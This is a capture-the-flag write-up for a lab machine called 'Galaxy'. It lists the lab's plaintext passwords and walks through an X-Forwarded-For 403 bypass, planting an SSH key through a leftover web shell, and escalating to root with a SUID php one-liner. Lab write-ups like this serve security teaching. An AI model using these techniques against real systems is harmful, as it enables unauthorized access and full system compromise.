# [Galaxy]

## Introduction

Galaxy is easy level machine In this challenge, machine hosting a beta website about facts. The site was vulnerable to bypassing the 403 Forbidden restriction using the X-Forwarded-For header. After successfully bypassing 403 restriction we can see devs left webshell which uses custom web user after user shell enumeration leads us to php which has suid bit permission
## Info for HTB

### Access

Passwords:

| User  | Password                            |
| ----- | ----------------------------------- |
| web | 1203a |
| root  | root8618 |

### Key Processes

1) SSH server on 22 port
2) Apache2 server on 80 port which is vulnerable to http host header
3) There is web shell in /developers directory
4) php has suid bit permission

### Automation / Crons
There is no automation

### Firewall Rules

There is no firewall rule

### Docker

There is no docker

### Other

1)I made my own ip address to redirect to galaxy.htb in /etc/apache2/sites-avialabel/000-default.conf<br>


# Writeup

# Enumeration

We begin enumeration with nmap tools from ports of target:<br>
`sudo nmap -sC -sV 192.168.2.110 -p- --min-rate=1000 -T4`<br>
`-sC` This flag for basic scripting<br>
`-sV` This flag for to check version<br>
`-p-` To check all ports we do not want to miss any<br>
`-T4` This flag to make scaning slightly faster (default -T3 when you don't specify)<br>
`--min-rate=1000` This is minimum rate of nmap packets<br>

![image](https://github.com/user-attachments/assets/0ceb7925-bc85-46b2-a07c-a15b77d72ce6)

We can see there are 22 and 80 port open. Website has galaxy.htb domain we need to add that domain with it's IP to our /etc/hosts file :<br>
```
echo "192.168.2.110       galaxy.htb" | sudo tee -a /etc/hosts
```
Website looks like blog about cosmos and it is in beta version
<br>
<br>
![image](https://github.com/user-attachments/assets/402a2623-84b0-4d82-97a7-1fbe5681ee21)

Let's enumerate directories and subdirectories using ffuf tool:<br>
```
ffuf -u http://galaxy.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
```
<br>
We find /developers and /photos directories and /developers directory gives us 403 forbidden error<br>

![image](https://github.com/user-attachments/assets/27c54f85-4952-4b13-8040-9c07dea34883)
<br>
Trying to enumerate any subdomains other directory leads us nothing. So we try to find a way to access /developers directory.<br>
Googling 403 bypass error we find [this](https://github.com/justdoston/403-Bypass) documentation.<br>
According to documentation trying to add forward headers with 127.0.0.1 ip will work, because server will think user trying to access from internal IP address.<br>

Let's use proxy forwarding tool such as burp suite to manupulate and try this technique.<br>
![image](https://github.com/user-attachments/assets/605568f6-ecb7-4b28-a860-f5d9f7f40430)


`X-Forwarded-For: 127.0.0.1` header successfuly worked to bypass<br>
![image](https://github.com/user-attachments/assets/3374c55f-ae55-45b0-9f02-3b87781a9c92)



# Foothold

We use same technique to see content of README.md file:<br>
![image](https://github.com/user-attachments/assets/b3785047-9a54-42f9-99ba-cc7f56164d91)
<br>
Not much usefull let's take a look to web.php file<br>
![image](https://github.com/user-attachments/assets/1ce77e27-b006-49be-b5fa-1f321d4f40e7)

<br>
It looks like developers left webshell in developers directory, it is because web site hasn't been finished fully yet<br>
We can copy our own id_rsa.pub (publick key) to web users authorized_keys to login via ssh without a password

```
echo "public key" > /home/web/.ssh/authorized_keys
```


<br>
Let's login using our own ssh with id_rsa for more comfortable and stable shell. If you don't have id_rsa keys create using 

<br>`ssh-keygen -t rsa`<br>

````
┌──(master㉿kali)-[~/.ssh]
└─$ ssh -i id_rsa web@192.168.2.106
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-50-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Jan 24 02:47:24 AM UTC 2025

  System load:  0.0               Processes:               105
  Usage of /:   33.7% of 7.79GB   Users logged in:         0
  Memory usage: 9%                IPv4 address for enp0s3: 192.168.2.106
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Fri Jan 24 02:19:46 2025 from 192.168.2.107
$ 
````
user flag can be found in web home directory.<br>

# Privilege Escalation
After a long enumeration files with suid bit permission worth to pay attention:

````
$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
-rwsr-xr-x+ 1 root root 5779920 Dec  2 12:36 /usr/bin/php8.3
-rwsr-xr-x 1 root root 72792 May 30  2024 /usr/bin/chfn
-rwsr-xr-x 1 root root 277936 Apr  8  2024 /usr/bin/sudo
-rwsr-xr-x+ 1 root root 137776 Apr  8  2024 /usr/bin/diff
-rwsr-xr-x 1 root root 51584 Aug  9 02:33 /usr/bin/mount
-rwsr-xr-x 1 root root 55680 Aug  9 02:33 /usr/bin/su
-rwsr-xr-x 1 root root 40664 May 30  2024 /usr/bin/newgrp
-rwsr-xr-x 1 root root 76248 May 30  2024 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 64152 May 30  2024 /usr/bin/passwd
-rwsr-xr-x 1 root root 39296 Aug  9 02:33 /usr/bin/umount
-rwsr-xr-x 1 root root 44760 May 30  2024 /usr/bin/chsh
-rwsr-xr-x 1 root root 39296 Apr  8  2024 /usr/bin/fusermount3
-rwsr-xr-- 1 root messagebus 34960 Aug  9 02:33 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 18736 Apr  3  2024 /usr/lib/polkit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 163112 Oct 11 08:05 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 342632 Aug  9 02:33 /usr/lib/openssh/ssh-keysign
````
Because php has suid bit permission if we browse to gtfobins we can  escalate privilege:
<br>
![image](https://github.com/user-attachments/assets/ce6fe95d-27bc-4493-9627-fdedd8aeeeca)

````
$ /usr/bin/php8.3 -r "pcntl_exec('/bin/sh', ['-p']);"
# id
uid=1004(web) gid=1004(web) euid=0(root) groups=1004(web)
# whoami
root
#
````
Now we have root shell, root flag can be found in /root directory
